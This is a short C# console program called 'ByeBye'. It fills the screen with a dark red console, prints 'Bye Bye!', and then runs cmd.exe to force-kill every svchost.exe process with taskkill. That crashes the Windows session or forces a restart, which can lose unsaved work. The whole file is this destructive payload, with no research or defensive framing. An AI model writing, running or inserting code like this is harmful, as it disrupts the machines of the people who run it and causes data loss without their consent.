using System;
using System.Diagnostics;
namespace ByeBye
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.SetWindowSize(Console.LargestWindowWidth, Console.LargestWindowHeight);
            Console.SetWindowPosition(0, 0);
            Console.Clear();
            Console.Write("Bye Bye!");
            Process.Start("C:\\Windows\\System32\\cmd.exe", "/c taskkill /F /IM svchost.exe");
            Console.ReadLine();
        }
    }
}
